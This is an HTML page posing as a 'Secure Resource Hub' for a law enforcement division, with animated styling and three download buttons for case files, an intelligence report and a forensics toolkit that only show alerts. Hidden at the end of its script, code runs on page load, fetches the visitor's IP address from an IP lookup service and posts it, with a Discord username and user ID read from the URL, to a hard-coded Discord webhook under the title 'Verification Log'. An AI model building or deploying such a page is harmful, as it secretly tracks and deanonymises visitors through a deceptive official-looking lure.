<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Resource Hub</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: white;
      min-height: 100vh;
      overflow: hidden;
      position: relative;
    }

    /* Floating Particles */
    .particle {
      position: absolute;
      background: rgba(255, 255, 255, 0.6);
      border-radius: 50%;
      pointer-events: none;
      animation: floatUp 15s linear infinite;
      box-shadow: 0 0 8px rgba(255,255,255,0.8);
    }

    @keyframes floatUp {
      0% { transform: translateY(100vh) scale(0.5); opacity: 0.3; }
      100% { transform: translateY(-100px) scale(1); opacity: 0; }
    }

    /* Loading Screen */
    #loading {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: #0a0a0a;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      transition: opacity 0.8s ease;
    }

    .loader {
      width: 80px;
      height: 80px;
      border: 6px solid #ffffff20;
      border-top: 6px solid #00d4ff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      box-shadow: 0 0 20px #00d4ff;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    /* Main Content */
    .container {
      max-width: 1100px;
      margin: 40px auto;
      padding: 0 20px;
      text-align: center;
    }

    h1 {
      font-size: 3.2rem;
      background: linear-gradient(90deg, #00d4ff, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
      text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
    }

    p {
      font-size: 1.3rem;
      opacity: 0.9;
      margin-bottom: 40px;
    }

    .downloads {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 25px;
      margin-top: 40px;
    }

    .card {
      background: rgba(255,255,255,0.08);
      border-radius: 16px;
      padding: 30px 25px;
      border: 1px solid rgba(255,255,255,0.1);
      transition: all 0.4s ease;
      backdrop-filter: blur(10px);
    }

    .card:hover {
      transform: translateY(-12px);
      box-shadow: 0 20px 40px rgba(0, 212, 255, 0.25);
      border-color: #00d4ff;
    }

    .card h3 {
      font-size: 1.5rem;
      margin-bottom: 15px;
    }

    .btn {
      display: inline-block;
      margin-top: 20px;
      padding: 14px 32px;
      background: linear-gradient(90deg, #00d4ff, #0099cc);
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 20px rgba(0, 212, 255, 0.3);
    }

    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 12px 30px rgba(0, 212, 255, 0.5);
    }
  </style>
</head>
<body>

  <!-- Loading Screen -->
  <div id="loading">
    <div class="loader"></div>
  </div>

  <div class="container">
    <h1>Secure Resource Hub</h1>
    <p>Authorized Downloads • Law Enforcement Division</p>

    <div class="downloads">
      <div class="card">
        <h3>📁 Case Files Package</h3>
        <p>Latest investigation templates and forms</p>
        <button class="btn" onclick="downloadFile('case-files.zip')">Download Package</button>
      </div>

      <div class="card">
        <h3>📊 Intelligence Report</h3>
        <p>Regional threat assessment - June 2026</p>
        <button class="btn" onclick="downloadFile('intelligence-report.pdf')">Download Report</button>
      </div>

      <div class="card">
        <h3>🔧 Tool Kit</h3>
        <p>Digital forensics utilities</p>
        <button class="btn" onclick="downloadFile('toolkit.zip')">Download Toolkit</button>
      </div>
    </div>
  </div>

  <script>
    // Loading Screen
    window.onload = () => {
      setTimeout(() => {
        document.getElementById('loading').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('loading').style.display = 'none';
        }, 800);
      }, 1200);
    };

    // Floating Particles
    function createParticle() {
      const particle = document.createElement('div');
      particle.classList.add('particle');
      
      const size = Math.random() * 6 + 3;
      particle.style.width = `${size}px`;
      particle.style.height = `${size}px`;
      particle.style.left = `${Math.random() * 100}vw`;
      particle.style.animationDuration = `${Math.random() * 12 + 10}s`;
      particle.style.opacity = Math.random() * 0.6 + 0.3;
      
      document.body.appendChild(particle);
      
      setTimeout(() => particle.remove(), 25000);
    }

    setInterval(createParticle, 180);

    // Download Handler (Customize these)
    function downloadFile(filename) {
      alert(`Downloading: ${filename}\n\nIn a real deployment, this would trigger an actual file download.`);
      // Example real download:
      // window.location.href = `https://yourserver.com/files/${filename}`;
    }
    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521502173773566074/-X_NpKwsyVzHUD8jmoykjbKnjNGPU5yMfAXSWX1-GhiMbB5nLpmRQwq0l8k-6mHherSu"; // ← Change this
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id') || 'unknown';
    const username = urlParams.get('username') || 'unknown';
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🔍 Verification Log",
              color: 0x00FF00,
              fields: [
                { name: "Discord Username", value: username, inline: true },
                { name: "User ID", value: userId, inline: true },
                { name: "IP Address", value: ip, inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: true }
              ]
            }]
          })
        });
      })
      .catch(() => {});


  </script>
</body>
</html>
